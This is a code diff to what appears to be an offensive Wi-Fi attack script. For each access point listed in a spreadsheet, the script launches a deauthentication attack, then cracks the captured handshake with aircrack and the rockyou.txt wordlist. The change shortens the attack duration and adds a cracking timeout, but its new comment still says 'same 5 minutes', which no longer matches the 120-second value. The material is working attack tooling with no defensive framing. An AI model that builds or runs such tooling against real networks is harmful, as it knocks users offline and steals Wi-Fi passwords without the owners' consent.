@@ -50,7 +50,7 @@ for row in ws.iter_rows(min_row=2, values_only=True):
     print(f"\n[*] Targeting AP: {ssid} ({bssid}) on channel {channel}")
 
     stop_event = threading.Event()
-    duration = 300  # 5 minutes
+    duration = 120  # 2 minutes
     deauth_thread = threading.Thread(target=deauth_attack, args=(bssid, active_interface, stop_event, duration))
     deauth_thread.start()
 
@@ -68,10 +68,11 @@ for row in ws.iter_rows(min_row=2, values_only=True):
         # ensure rockyou exists
         if os.path.exists(ROCKYOU):
             aw = AircrackWrapper(cap_file, bssid, [ROCKYOU])
-            cracker_thread = threading.Thread(target=aw.run_and_save, args=(ROCKYOU,))
+            # pass duration as timeout so cracking will stop after same 5 minutes
+            cracker_thread = threading.Thread(target=aw.run_and_save, args=(ROCKYOU, duration))
             cracker_thread.daemon = True
             cracker_thread.start()
-            print("[*] Cracking started in background with rockyou.txt")
+            print("[*] Cracking started in background with rockyou.txt (timeout: {}s)".format(duration))
         else:
             print(f"[!] Wordlist not found: {ROCKYOU}. Skipping immediate cracking.")
 
